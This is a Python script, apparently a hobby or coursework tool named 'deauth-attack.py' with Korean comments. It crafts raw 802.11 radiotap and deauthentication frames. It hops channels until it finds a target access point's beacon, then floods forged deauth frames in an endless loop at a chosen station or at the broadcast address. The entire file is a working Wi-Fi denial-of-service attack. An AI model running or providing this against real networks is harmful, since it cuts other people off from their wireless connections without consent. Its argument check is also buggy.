import socket
import sys
import os
import time
import random
from struct import *

class RadiotapHeader :
    def __init__(self) :
        self.Header_revision = b'\x00'                                   # 1 byte
        self.Header_pad = b'\x00'                                        # 1 byte
        self.Header_length = pack('h', 12)                               # 2 byte
        self.Present_flags_word = b'\x04\x80\x00\x00'       # 4 byte
        # self.Flags = b'\x00'                                             # 1 byte
        self.Data_rate = b'\x02\x00'                                         # 2 byte
        # self.Channel_frequency = pack('h', ch)                           # 2 byte
        # self.Channel_flags = b'\xa0\x00'                                 # 2 byte
        # self.Antenna_signal1 = pack('b', -35) + b'\x00'                  # 2 byte
        self.RX_flags = b'\x18\x00'                                      # 2 byte
        # self.Antenna_signal2 = self.Antenna_signal1                      # 2 byte

class RadiotapHeader2 :
    def __init__(self, ch) :
        self.Header_revision = b'\x00'                                   # 1 byte
        self.Header_pad = b'\x00'                                        # 1 byte
        self.Header_length = pack('h', 24)                               # 2 byte
        self.Present_flags_word = b'\x2e\x40\x00\xa0\x20\x08\x00\x00'    # 8 byte
        self.Flags = b'\x00'                                             # 1 byte
        self.Data_rate = b'\x0c'                                         # 1 byte
        self.Channel_frequency = pack('h', ch)                         # 2 byte
        self.Channel_flags = b'\xc0\x00'                                 # 2 byte
        self.Antenna_signal1 = pack('b', -35) + b'\x00'                  # 2 byte
        self.RX_flags = b'\x00\x00'                                      # 2 byte
        self.Antenna_signal2 = self.Antenna_signal1                      # 2 byte

class Deauthentication :
    def __init__(self, ds, ts, seq) :
        self.Frame_control = b'\xc0\x00'
        self.Duration = b'\x3a\x01'
        self.Ds_address = ds
        self.Ts_address = ts
        self.BSS_id = self.Ts_address
        self.Sequence_number = pack('H', (seq % 4095) << 4)
        self.Fixed = b'\x07\x00'

def beacon_check(interface_name, bssid) :
    try:
        rawSocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        rawSocket.bind((interface_name,0))
        rawSocket.settimeout(0.8)
        # if 
        packet = rawSocket.recvfrom(2048)[0]
        # 인터페이스 패킷 캡처
    except:
        return None
    
    radiotap_header_length = unpack('>bb', packet[2:4])[0]
    if radiotap_header_length == 0:
        return None # 가끔 오류나는 것 때문에
    radiotap_header = packet[0:radiotap_header_length]
    channel = unpack('h', radiotap_header[14:16])[0]
    frame_data = packet[radiotap_header_length:]
    beacon_check = frame_data[0:1]

    if beacon_check == b'\x80' :
        packet_bssid = frame_data[16:22]
        sequence = unpack('H', frame_data[22:24])[0] >> 4
        if bssid == packet_bssid :
            return {"sequence" : sequence, "channel": channel}
        else :
            return None
    else :
        return None

def str2mac(string) :
    mac = bytes()
    for b in string.split(":") :
        mac += pack("B", int(b, 16))
    return mac



if len(sys.argv) <  3 & len(sys.argv) > 5:
    print("syntax : sudo python3 deauth-attack.py <interface> <ap mac> [<station mac> [-auth]]")
    sys.exit()
interface_name = sys.argv[1]
ap = str2mac(sys.argv[2])
station = b'\xff\xff\xff\xff\xff\xff'
if len(sys.argv) >= 4 :
    station = str2mac(sys.argv[3])
    # if len(sys.argv) == 5 & sys.argv[4] == "-auth":
        # auth attack

channel = 1
os.system("iwconfig " + interface_name + " channel " + str(channel))
while 1:
    info = beacon_check(interface_name, ap)
    if info is None:
        channel = (channel + 5) % 14
        if channel == 0 :
            channel += 1
        os.system("iwconfig " + interface_name + " channel " + str(channel))
    else :
        break

ch = int(info['channel'])
seq = int(info['sequence'])
print("채널: " + str((ch - 2407) // 5))

seq = 0
while 1:
    rh = RadiotapHeader()
    radiotap_header_packet = bytes()
    for value in rh.__dict__.values():
        radiotap_header_packet += value
    # Radiotap_Header

    if seq % 2 == 0:
        da = Deauthentication(station, ap, seq)
    else:
        da = Deauthentication(ap, station, seq)
    deauthentication_packet = bytes()
    for value in da.__dict__.values():
        deauthentication_packet += value
    # Deauthentication

    seq += 1

    # print(radiotap_header_packet + deauthentication_packet)

    rawSocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    rawSocket.bind((interface_name,0))
    rawSocket.send(radiotap_header_packet + deauthentication_packet)
    # 패킷 송신
    # time.sleep(0.01)

